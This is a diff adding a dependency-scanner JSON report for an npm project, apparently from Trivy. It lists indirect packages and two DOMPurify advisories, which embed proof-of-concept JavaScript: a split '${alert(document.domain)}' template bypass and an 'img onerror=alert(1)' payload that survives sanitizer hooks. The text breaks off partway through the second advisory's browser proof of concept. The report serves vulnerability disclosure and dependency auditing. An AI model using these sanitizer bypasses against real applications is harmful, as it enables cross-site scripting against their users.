+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2726,
+              "EndLine": 2734
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "baseline-browser-mapping@2.11.15",
+          "Name": "baseline-browser-mapping",
+          "Identifier": {
+            "PURL": "pkg:npm/baseline-browser-mapping@2.11.15",
+            "UID": "4ad1d89f68f418da"
+          },
+          "Version": "2.11.15",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2735,
+              "EndLine": 2746
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "caniuse-lite@1.0.30001809",
+          "Name": "caniuse-lite",
+          "Identifier": {
+            "PURL": "pkg:npm/caniuse-lite@1.0.30001809",
+            "UID": "e43de5a62a3532ef"
+          },
+          "Version": "1.0.30001809",
+          "Licenses": [
+            "CC-BY-4.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2865,
+              "EndLine": 2884
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "canvg@3.0.11",
+          "Name": "canvg",
+          "Identifier": {
+            "PURL": "pkg:npm/canvg@3.0.11",
+            "UID": "8397b68f238126ac"
+          },
+          "Version": "3.0.11",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@babel/runtime@7.29.7",
+            "@types/raf@3.4.3",
+            "core-js@3.50.0",
+            "raf@3.4.1",
+            "regenerator-runtime@0.13.11",
+            "rgbcolor@1.0.1",
+            "stackblur-canvas@2.7.0",
+            "svg-pathdata@6.0.3"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2895,
+              "EndLine": 2914
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "client-only@0.0.1",
+          "Name": "client-only",
+          "Identifier": {
+            "PURL": "pkg:npm/client-only@0.0.1",
+            "UID": "aec17f08d39d0da"
+          },
+          "Version": "0.0.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2932,
+              "EndLine": 2937
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "core-js@3.50.0",
+          "Name": "core-js",
+          "Identifier": {
+            "PURL": "pkg:npm/core-js@3.50.0",
+            "UID": "592563c1dfc309b2"
+          },
+          "Version": "3.50.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2981,
+              "EndLine": 2995
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "css-line-break@2.1.0",
+          "Name": "css-line-break",
+          "Identifier": {
+            "PURL": "pkg:npm/css-line-break@2.1.0",
+            "UID": "b70c7aacff4dceec"
+          },
+          "Version": "2.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "utrie@1.0.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3011,
+              "EndLine": 3019
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "detect-libc@2.1.2",
+          "Name": "detect-libc",
+          "Identifier": {
+            "PURL": "pkg:npm/detect-libc@2.1.2",
+            "UID": "5cd534e595599c8f"
+          },
+          "Version": "2.1.2",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3149,
+              "EndLine": 3158
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "dompurify@3.4.13",
+          "Name": "dompurify",
+          "Identifier": {
+            "PURL": "pkg:npm/dompurify@3.4.13",
+            "UID": "699183137de1e003"
+          },
+          "Version": "3.4.13",
+          "Licenses": [
+            "(MPL-2.0 OR Apache-2.0)"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@types/trusted-types@2.0.7"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3172,
+              "EndLine": 3181
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "fast-png@6.4.0",
+          "Name": "fast-png",
+          "Identifier": {
+            "PURL": "pkg:npm/fast-png@6.4.0",
+            "UID": "749aea30602c0695"
+          },
+          "Version": "6.4.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@types/pako@2.0.4",
+            "iobuffer@5.4.0",
+            "pako@2.2.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3904,
+              "EndLine": 3914
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "fflate@0.8.3",
+          "Name": "fflate",
+          "Identifier": {
+            "PURL": "pkg:npm/fflate@0.8.3",
+            "UID": "5ebd66f91403a00b"
+          },
+          "Version": "0.8.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3925,
+              "EndLine": 3930
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "iobuffer@5.4.0",
+          "Name": "iobuffer",
+          "Identifier": {
+            "PURL": "pkg:npm/iobuffer@5.4.0",
+            "UID": "692846b019123888"
+          },
+          "Version": "5.4.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 4384,
+              "EndLine": 4389
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "nanoid@3.3.18",
+          "Name": "nanoid",
+          "Identifier": {
+            "PURL": "pkg:npm/nanoid@3.3.18",
+            "UID": "1b12e2872c2909e0"
+          },
+          "Version": "3.3.18",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 5419,
+              "EndLine": 5436
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "pako@2.2.0",
+          "Name": "pako",
+          "Identifier": {
+            "PURL": "pkg:npm/pako@2.2.0",
+            "UID": "16d3cbedf09bd076"
+          },
+          "Version": "2.2.0",
+          "Licenses": [
+            "(MIT AND Zlib)"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 5762,
+              "EndLine": 5777
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "performance-now@2.1.0",
+          "Name": "performance-now",
+          "Identifier": {
+            "PURL": "pkg:npm/performance-now@2.1.0",
+            "UID": "6a5fe1d949dac6f8"
+          },
+          "Version": "2.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 5818,
+              "EndLine": 5824
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "picocolors@1.1.1",
+          "Name": "picocolors",
+          "Identifier": {
+            "PURL": "pkg:npm/picocolors@1.1.1",
+            "UID": "2e04ba150796e62c"
+          },
+          "Version": "1.1.1",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 5825,
+              "EndLine": 5830
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "postcss@8.5.23",
+          "Name": "postcss",
+          "Identifier": {
+            "PURL": "pkg:npm/postcss@8.5.23",
+            "UID": "59ee08f59bb886a2"
+          },
+          "Version": "8.5.23",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "nanoid@3.3.18",
+            "picocolors@1.1.1",
+            "source-map-js@1.2.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5513,
+              "EndLine": 5540
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "raf@3.4.1",
+          "Name": "raf",
+          "Identifier": {
+            "PURL": "pkg:npm/raf@3.4.1",
+            "UID": "13ddd4882048b9c"
+          },
+          "Version": "3.4.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "performance-now@2.1.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5936,
+              "EndLine": 5945
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "regenerator-runtime@0.13.11",
+          "Name": "regenerator-runtime",
+          "Identifier": {
+            "PURL": "pkg:npm/regenerator-runtime@0.13.11",
+            "UID": "21cf5be563cf484e"
+          },
+          "Version": "0.13.11",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 5997,
+              "EndLine": 6003
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "rgbcolor@1.0.1",
+          "Name": "rgbcolor",
+          "Identifier": {
+            "PURL": "pkg:npm/rgbcolor@1.0.1",
+            "UID": "64534ffd271e5f0c"
+          },
+          "Version": "1.0.1",
+          "Licenses": [
+            "MIT OR SEE LICENSE IN FEEL-FREE.md"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 6080,
+              "EndLine": 6089
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "scheduler@0.27.0",
+          "Name": "scheduler",
+          "Identifier": {
+            "PURL": "pkg:npm/scheduler@0.27.0",
+            "UID": "db152d672618ffa4"
+          },
+          "Version": "0.27.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 6169,
+              "EndLine": 6174
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "semver@7.8.5",
+          "Name": "semver",
+          "Identifier": {
+            "PURL": "pkg:npm/semver@7.8.5",
+            "UID": "251d01c8924163be"
+          },
+          "Version": "7.8.5",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2011,
+              "EndLine": 2023
+            },
+            {
+              "StartLine": 4471,
+              "EndLine": 4483
+            },
+            {
+              "StartLine": 6284,
+              "EndLine": 6296
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "sharp@0.35.3",
+          "Name": "sharp",
+          "Identifier": {
+            "PURL": "pkg:npm/sharp@0.35.3",
+            "UID": "a3b2d5cf3215c021"
+          },
+          "Version": "0.35.3",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@img/colour@1.1.0",
+            "@img/sharp-darwin-arm64@0.35.3",
+            "@img/sharp-darwin-x64@0.35.3",
+            "@img/sharp-freebsd-wasm32@0.35.3",
+            "@img/sharp-libvips-darwin-arm64@1.3.2",
+            "@img/sharp-libvips-darwin-x64@1.3.2",
+            "@img/sharp-libvips-linux-arm64@1.3.2",
+            "@img/sharp-libvips-linux-arm@1.3.2",
+            "@img/sharp-libvips-linux-ppc64@1.3.2",
+            "@img/sharp-libvips-linux-riscv64@1.3.2",
+            "@img/sharp-libvips-linux-s390x@1.3.2",
+            "@img/sharp-libvips-linux-x64@1.3.2",
+            "@img/sharp-libvips-linuxmusl-arm64@1.3.2",
+            "@img/sharp-libvips-linuxmusl-x64@1.3.2",
+            "@img/sharp-linux-arm64@0.35.3",
+            "@img/sharp-linux-arm@0.35.3",
+            "@img/sharp-linux-ppc64@0.35.3",
+            "@img/sharp-linux-riscv64@0.35.3",
+            "@img/sharp-linux-s390x@0.35.3",
+            "@img/sharp-linux-x64@0.35.3",
+            "@img/sharp-linuxmusl-arm64@0.35.3",
+            "@img/sharp-linuxmusl-x64@0.35.3",
+            "@img/sharp-webcontainers-wasm32@0.35.3",
+            "@img/sharp-win32-arm64@0.35.3",
+            "@img/sharp-win32-ia32@0.35.3",
+            "@img/sharp-win32-x64@0.35.3",
+            "detect-libc@2.1.2",
+            "semver@7.8.5"
+          ],
+          "Locations": [
+            {
+              "StartLine": 6234,
+              "EndLine": 6283
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "source-map-js@1.2.1",
+          "Name": "source-map-js",
+          "Identifier": {
+            "PURL": "pkg:npm/source-map-js@1.2.1",
+            "UID": "2f051fe8bb50fd1d"
+          },
+          "Version": "1.2.1",
+          "Licenses": [
+            "BSD-3-Clause"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 6396,
+              "EndLine": 6404
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "stackblur-canvas@2.7.0",
+          "Name": "stackblur-canvas",
+          "Identifier": {
+            "PURL": "pkg:npm/stackblur-canvas@2.7.0",
+            "UID": "482c96e3b31a7e06"
+          },
+          "Version": "2.7.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 6412,
+              "EndLine": 6421
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "styled-jsx@5.1.6",
+          "Name": "styled-jsx",
+          "Identifier": {
+            "PURL": "pkg:npm/styled-jsx@5.1.6",
+            "UID": "ccfa020e5e63b667"
+          },
+          "Version": "5.1.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "client-only@0.0.1",
+            "react@19.2.8"
+          ],
+          "Locations": [
+            {
+              "StartLine": 6573,
+              "EndLine": 6595
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "svg-pathdata@6.0.3",
+          "Name": "svg-pathdata",
+          "Identifier": {
+            "PURL": "pkg:npm/svg-pathdata@6.0.3",
+            "UID": "7fcd2de906c66f9f"
+          },
+          "Version": "6.0.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 6622,
+              "EndLine": 6631
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "text-segmentation@1.0.3",
+          "Name": "text-segmentation",
+          "Identifier": {
+            "PURL": "pkg:npm/text-segmentation@1.0.3",
+            "UID": "35e6152a06d482e5"
+          },
+          "Version": "1.0.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "utrie@1.0.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 6663,
+              "EndLine": 6671
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "tslib@2.8.1",
+          "Name": "tslib",
+          "Identifier": {
+            "PURL": "pkg:npm/tslib@2.8.1",
+            "UID": "2e6c76e8123a7268"
+          },
+          "Version": "2.8.1",
+          "Licenses": [
+            "0BSD"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 6772,
+              "EndLine": 6777
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "utrie@1.0.2",
+          "Name": "utrie",
+          "Identifier": {
+            "PURL": "pkg:npm/utrie@1.0.2",
+            "UID": "60f4924485d47890"
+          },
+          "Version": "1.0.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "base64-arraybuffer@1.0.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 7012,
+              "EndLine": 7020
+            }
+          ],
+          "AnalyzedBy": "npm"
+        }
+      ],
+      "Vulnerabilities": [
+        {
+          "VulnerabilityID": "GHSA-cg2g-xh64-v4q7",
+          "PkgID": "dompurify@3.4.13",
+          "PkgName": "dompurify",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/dompurify@3.4.13",
+            "UID": "699183137de1e003"
+          },
+          "InstalledVersion": "3.4.13",
+          "FixedVersion": "3.4.17",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-cg2g-xh64-v4q7",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:4247ca493a0cddd534b791377ab8b09336387232111639f8aeab782435a2b575",
+          "Title": "DOMPurify SAFE_FOR_TEMPLATES bypass: split template expressions survive in attached shadow root content on DOM output modes",
+          "Description": "## Summary\n\nWhen DOMPurify is configured with `SAFE_FOR_TEMPLATES: true` together with a DOM-returning mode (`RETURN_DOM: true`, `RETURN_DOM_FRAGMENT: true`, or `IN_PLACE: true`), template expressions such as `{{...}}`, `${...}`, and `\u003c%...%\u003e` survive sanitization inside the text content of an attached shadow root. The post-walk safety net `_scrubTemplateExpressions` (`src/purify.ts:1717`) was extended to recurse into `\u003ctemplate\u003e.content`, but it never recurses into attached shadow roots. An attacker who can supply a DOM node carrying a shadow root (the `IN_PLACE` and shadow-aware `RETURN_DOM` surfaces) can split an expression across text nodes separated by disallowed elements; after those elements are removed the fragments become adjacent and serialize into a complete expression that a downstream template engine will evaluate.\n\n## Root Cause\n\n`SAFE_FOR_TEMPLATES` neutralizes template expressions through two mechanisms: a per-text-node strip during the main walk (`_stripTemplateExpressions`, applied in `_sanitizeElements` at `src/purify.ts:2246`), and a final post-walk pass (`_scrubTemplateExpressions`, `src/purify.ts:1717`) that normalizes adjacent text nodes and re-strips expressions that only form after merging. The per-node strip cannot catch an expression that is split into individual fragments, because each fragment fails the delimiter regexes. The post-walk pass is the only mechanism that would catch the merged form, but it is structurally unable to reach shadow root content.\n\n```text\n_scrubTemplateExpressions (src/purify.ts:1717-1751):\n  - node.normalize() at line 1718 does not merge text nodes inside shadow roots (DOM spec).\n  - NodeIterator at lines 1723-1731 does not descend into shadow trees (DOM spec).\n  - Explicit recursion at lines 1743-1750 enters \u003ctemplate\u003e.content only, via\n    querySelectorAll('template'); there is no equivalent recursion into attached\n    shadow roots.\nShadow roots are sanitized earlier by _sanitizeShadowDOM (src/purify.ts:2710), which\napplies the per-node strip but never performs the post-walk normalize-and-rescrub.\n```\n\nShadow root text nodes are therefore sanitized only per-node and never re-examined as a merged unit.\n\n## Impact\n\nAn attacker who controls DOM-node input containing an attached shadow root can inject template expressions that survive sanitization and are later evaluated by the application's template engine. In client-side contexts this yields cross-site scripting; in a server-side template context it can escalate to template injection. Exploitation requires non-default application configuration: the application must enable `SAFE_FOR_TEMPLATES` and a DOM-returning mode, pass a DOM node that already has an attached shadow root, and feed the sanitized shadow root content into a template evaluator. The shadow root does not have to be built programmatically with `attachShadow`: in engines that support declarative shadow DOM, attacker-supplied markup containing `\u003ctemplate shadowrootmode=\"open\"\u003e` parsed through `setHTMLUnsafe` or `Document.parseHTMLUnsafe` produces the same attached shadow root, so a plain HTML string reaches the gap once the application is configured this way. Demonstrated capability is injection of a complete, attacker-chosen expression into post-sanitization shadow root content; the resulting script execution and any confidentiality or integrity consequence depend on the downstream engine's evaluation context.\n\n## Proof of Concept\n\n```text\nPreconditions:\n  - DOMPurify built from the affected source (dist/purify.js or an ESM/CJS bundle).\n  - A browser (or DOM implementation) with shadow DOM support.\n  - Application constructs a DOM node with an attached shadow root before sanitizing,\n    and later evaluates the shadow root's text content as a template.\n```\n\nBuild a host element whose shadow root holds a template expression split across text nodes separated by disallowed elements, then sanitize in place with `SAFE_FOR_TEMPLATES`:\n\n```javascript\nconst host = document.createElement('div');\nconst root = host.attachShadow({ mode: 'open' });\n\n// Split \"${alert(document.domain)}\" so no single fragment matches a regex.\n// \u003cobject\u003e is not in the default ALLOWED_TAGS and is removed during sanitization,\n// leaving the surrounding text-node siblings adjacent.\nroot.appendChild(document.createTextNode('$'));\nroot.appendChild(document.createElement('object'));\nroot.appendChild(document.createTextNode('{alert(document.domain)}'));\n\nDOMPurify.sanitize(host, { IN_PLACE: true, SAFE_FOR_TEMPLATES: true });\n\n// After the disallowed element is removed, the fragments are adjacent and survive.\nhost.shadowRoot.normalize();\nconsole.log(host.shadowRoot.textContent);\n```\n\n```text\n${alert(document.domain)}\n```\n\nA downstream template evaluator reading `shadowRoot.textContent` (for example `new Function('return `' + content + '`')()` or any `${...}`/`{{...}}` engine) then evaluates the fully formed expression.\n\n## Attack Chain\n\n1. **Exposure:** The application calls `DOMPurify.sanitize(node, cfg)` (`src/purify.ts:2854`) with `SAFE_FOR_TEMPLATES: true` and `IN_PLACE: true` (or a shadow-aware `RETURN_DOM`), passing a DOM node that already carries an attached shadow root.\n2. **Control:** The attacker controls the shadow root's text nodes and the disallowed separator elements between them; each fragment (`$`, `{alert(document.domain)}`) is a valid, individually benign text node.\n3. **Path:** `_sanitizeAttachedShadowRoots` (`src/purify.ts:2977`) feeds the shadow root into `_sanitizeShadowDOM` (`src/purify.ts:2710`), which strips expressions per text node (`src/purify.ts:2246`) and removes the disallowed separator elements, leaving the fragments adjacent.\n4. **Guard:** The post-walk safety net `_scrubTemplateExpressions` (`src/purify.ts:3131-3132`) is the only pass that would catch the merged expression, but it never recurses into shadow roots (`src/purify.ts:1717-1751` recurses into `\u003ctemplate\u003e.content` only).\n5. **Primitive:** The adjacent fragments serialize as a single concatenated string on `shadowRoot.textContent` / `shadowRoot.innerHTML`, reconstituting the complete expression.\n6. **Result:** A downstream template engine evaluates the attacker-chosen expression, achieving script execution (or template injection) in the engine's context.\n\n## Bypass Evidence\n\nThe relevant protection is `SAFE_FOR_TEMPLATES`, specifically the post-walk pass that defends against expressions that only form after adjacent text nodes merge. That defense was previously extended to `\u003ctemplate\u003e.content` under CVE-2026-65900 (GHSA-gvmj-g25r-r7wr) by adding `querySelectorAll('template')` recursion at `src/purify.ts:1743-1750`. The strongest challenge is whether any code path performs the equivalent merge-and-rescrub inside shadow roots. Enumerating every call site of `_scrubTemplateExpressions` (`src/purify.ts:1717`, `1747`, `3132`, `3141`) shows none receive a shadow root, and `_sanitizeShadowDOM` (`src/purify.ts:2710`) never calls `_scrubTemplateExpressions` or `normalize()`. The per-node strip cannot compensate: `MUSTACHE_EXPR` (`src/regexp.ts:3`) requires `{{` or `}}`, `TMPLIT_EXPR` (`src/regexp.ts:5`) requires `${`, and `ERB_EXPR` (`src/regexp.ts:4`) requires `\u003c%` or `%\u003e`, none of which appear in a single-character fragment. The CVE-2026-65900 regression tests exercise `\u003ctemplate\u003e.content` only; no test covers shadow root content under `SAFE_FOR_TEMPLATES`. The gap is therefore an unfixed case on a distinct remediation boundary (shadow roots) rather than a bypass of the delivered template-content fix.\n\n## Affected Versions\n\n- **Ecosystem:** `npm`\n- **Package:** `dompurify`\n- **Confirmed affected range:** `\u003e= 3.4.4, \u003c= 3.4.16`\n- **Latest release checked:** `3.4.16` ([npm registry](https://www.npmjs.com/package/dompurify/v/3.4.16))\n- **Fix status:** not fixed\n\nThe lower bound 3.4.4 is the release that introduced both the attached-shadow-root sanitization pass and the `_scrubTemplateExpressions` safety net; releases 3.4.4 through 3.4.7 carry the safety net with no content-container recursion, and 3.4.8 onward add `\u003ctemplate\u003e.content` recursion but still omit shadow root recursion. No published release and no current development revision contains a shadow-root fix.\n\n## Suggested Fix\n\nEnforce the same post-walk normalize-and-rescrub invariant on attached shadow roots that already applies to `\u003ctemplate\u003e.content`. After `_sanitizeShadowDOM` finishes walking a shadow root, run `_scrubTemplateExpressions` over that shadow root so adjacent text nodes created by element removal are merged and re-stripped; alternatively, have `_scrubTemplateExpressions` discover and recurse into attached shadow roots as it does for template content. The fix must cover nested shadow roots and shadow roots inside `\u003ctemplate\u003e.content`, and it must handle all three expression dialects, since any disallowed element can serve as the separator that produces adjacent fragments.\n\n---\n\nReported by zx (GitHub: @manus-pi).",
+          "Severity": "CRITICAL",
+          "VendorSeverity": {
+            "ghsa": 4
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N",
+              "V40Score": 9.2
+            }
+          },
+          "References": [
+            "https://advisory.echohq.com/cve/GHSA-cg2g-xh64-v4q7",
+            "https://github.com/advisories/GHSA-cg2g-xh64-v4q7",
+            "https://github.com/cure53/DOMPurify",
+            "https://github.com/cure53/DOMPurify/commit/a77a3e78b59f72fa4d1c83f22e121ad9cc7d3575",
+            "https://github.com/cure53/DOMPurify/pull/1672",
+            "https://github.com/cure53/DOMPurify/releases/tag/3.4.17",
+            "https://github.com/cure53/DOMPurify/security/advisories/GHSA-cg2g-xh64-v4q7"
+          ],
+          "PublishedDate": "2026-10-22T16:25:31Z",
+          "LastModifiedDate": "2026-10-22T16:25:31Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-mrv2-3pqr-j5jr",
+          "PkgID": "dompurify@3.4.13",
+          "PkgName": "dompurify",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/dompurify@3.4.13",
+            "UID": "699183137de1e003"
+          },
+          "InstalledVersion": "3.4.13",
+          "FixedVersion": "3.4.17",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-mrv2-3pqr-j5jr",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:2747319fcc9caa3ec760473520fe2072b6bfd328bc6968656bd8d16c836b43d8",
+          "Title": "DOMPurify IN_PLACE: hook that removes a parent or sibling leaves the detached subtree's event handlers armed (incomplete fix for GHSA-p98j-92pf-mc4p)",
+          "Description": "### Summary\n\nThe 3.4.16 fix for GHSA-p98j-92pf-mc4p only covers a hook that removes the node it was called for. If an `IN_PLACE` hook removes a different node, like the current node's parent or a sibling that has not been visited yet, that subtree is never walked or neutralized. Event handlers in it stay on the elements, and an `\u003cimg onerror\u003e` that was already loading fires after `sanitize()` returns.\n\nThe README says: \"Nodes that a hook detaches from the tree ... are treated as removed. In IN_PLACE mode their subtree is neutralized inline, so an `\u003cimg onload\u003e` that was already loading when you built the live tree cannot fire after `sanitize()` returns.\" That does not hold when the detached node is not the hook's own node.\n\n### Tested versions\n\n- 3.4.16 (latest) and main at 18f8f0e\n- also 3.4.15, 3.4.12 and 2.5.8\n\njsdom for the matrix below, and Chromium (Playwright) for the event actually firing.\n\n### Details\n\n`src/purify.ts` line 2134 (`dist/purify.cjs.js` line 2009 in 3.4.16), `_handleHookDetachedNode()`:\n\n```js\nif (currentNode === root || getParentNode(currentNode) !== null) {\n  return false;\n}\nif (IN_PLACE) {\n  _neutralizeSubtree(currentNode);\n}\n```\n\nIt only checks whether `currentNode` lost its parent. When a hook removes `currentNode.parentNode` (or any ancestor), `currentNode` still has a parent, so nothing happens. The rest of the removed subtree is no longer reachable by the walker, and it is not in `DOMPurify.removed`, so the post walk pass does not see it either. The same happens when a hook removes a later sibling. This applies to all five element and attribute hooks.\n\n### PoC (jsdom)\n\n```js\nconst { JSDOM } = require('jsdom')\nconst createDOMPurify = require('dompurify')\nconst win = new JSDOM('\u003c!doctype html\u003e\u003cbody\u003e\u003c/body\u003e').window\nconst doc = win.document\n\nfor (const mode of ['self', 'parent', 'nextSibling']) {\n  const DOMPurify = createDOMPurify(win)\n  doc.body.innerHTML = '\u003cdiv id=root\u003e\u003cfigure\u003e\u003cimg class=bad src=a.png\u003e' +\n    '\u003cimg id=evil src=x onerror=alert(1)\u003e\u003c/figure\u003e\u003cp\u003eok\u003c/p\u003e\u003c/div\u003e'\n  const root = doc.getElementById('root')\n  const evil = doc.getElementById('evil')\n\n  // app hook: drop a bad image (self), its wrapper (parent), or the next element (nextSibling)\n  DOMPurify.addHook('afterSanitizeAttributes', (node) =\u003e {\n    if (node.getAttribute \u0026\u0026 node.getAttribute('class') === 'bad') {\n      if (mode === 'self') node.remove()\n      if (mode === 'parent') node.parentNode.remove()\n      if (mode === 'nextSibling') node.nextElementSibling.remove()\n    }\n  })\n\n  DOMPurify.sanitize(root, { IN_PLACE: true })\n  console.log(DOMPurify.version, mode.padEnd(11), 'onerror =', JSON.stringify(evil.getAttribute('onerror')))\n}\n```\n\nOutput on 3.4.16:\n\n```\n3.4.16 self        onerror = null\n3.4.16 parent      onerror = \"alert(1)\"\n3.4.16 nextSibling onerror = \"alert(1)\"\n```\n\nIn `self` mode the walker still reaches the second image and strips `onerror`. In the other two modes the second image is detached with its handler still set. The same result is achieved with each of `beforeSanitizeElements`, `uponSanitizeElement`, `afterSanitizeElements`, `beforeSanitizeAttributes` and `afterSanitizeAttributes`.\n\n### PoC (browser)\n\nThe same thing in a real page, served from 127.0.0.1 and opened in Chromium:\n\n```html\n\u003c!doctype html\u003e\u003cmeta charset=utf-8\u003e\n\u003cscript src=\"purify.min.js\"\u003e\u003c/script\u003e\n\u003cbody\u003e\u003cpre id=log\u003e\u003c/pre\u003e\n\u003cscript\u003e\nwindow.fired = [];\nfunction run(mode) {\n  const D = DOMPurify(window);\n  D.addHook('afterSanitizeAttributes', n =\u003e {\n    if (n.getAttribute \u0026\u0026 n.getAttribute('class') === 'bad') {\n      if (mode === 'parent') n.parentNode.remove();\n      if (mode === 'self') n.remove();\n    }\n  });\n  const root = document.createElement('div');\n  document.body.appendChild(root);\n  